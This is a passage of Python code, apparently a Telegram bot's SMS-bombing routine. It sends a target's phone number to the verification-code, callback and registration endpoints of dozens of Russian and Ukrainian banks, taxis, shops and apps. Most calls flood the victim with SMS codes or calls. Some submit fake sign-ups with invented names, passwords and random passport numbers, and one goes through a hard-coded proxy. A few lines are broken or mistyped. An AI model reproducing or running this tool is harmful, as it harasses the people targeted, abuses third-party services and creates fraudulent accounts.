            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Inv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sber отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
        except:
             print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print('[@'+str(bot_username)+'] [-] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Андрей",
                "surname": "Гордон",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1995",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print('[@'+str(bot_username)+'] [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print('[@'+str(bot_username)+'] [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print('[@'+str(bot_username)+'] [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print('[@'+str(bot_username)+'] [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print('[@'+str(bot_username)+'] [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print('[@'+str(bot_username)+'] [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print('[@'+str(bot_username)+'] [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print('[@'+str(bot_username)+'] [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print('[@'+str(bot_username)+'] [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print('[@'+str(bot_username)+'] [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print('[@'+str(bot_username)+'] [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print('[@'+str(bot_username)+'] [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print('[@'+str(bot_username)+'] [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print('[@'+str(bot_username)+'] [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print('[@'+str(bot_username)+'] [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print('[@'+str(bot_username)+'] [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print('[@'+str(bot_username)+'] [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print('[@'+str(bot_username)+'] [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print('[@'+str(bot_username)+'] [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print('[@'+str(bot_username)+'] [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print('[@'+str(bot_username)+'] [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print('[@'+str(bot_username)+'] [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print('[@'+str(bot_username)+'] [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print('[@'+str(bot_username)+'] [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print('[@'+str(bot_username)+'] [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print('[@'+str(bot_username)+'] [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print('[@'+str(bot_username)+'] [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print('[@'+str(bot_username)+'] [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print('[@'+str(bot_username)+'] [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print('[@'+str(bot_username)+'] [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print('[@'+str(bot_username)+'] [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print('[@'+str(bot_username)+'] [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print('[@'+str(bot_username)+'] [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[@'+str(bot_username)+'] [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print('[@'+str(bot_username)+'] [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print('[@'+str(bot_username)+'] [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print('[@'+str(bot_username)+'] [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print('[@'+str(bot_username)+'] [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print('[@'+str(bot_username)+'] [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[@'+str(bot_username)+'] [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
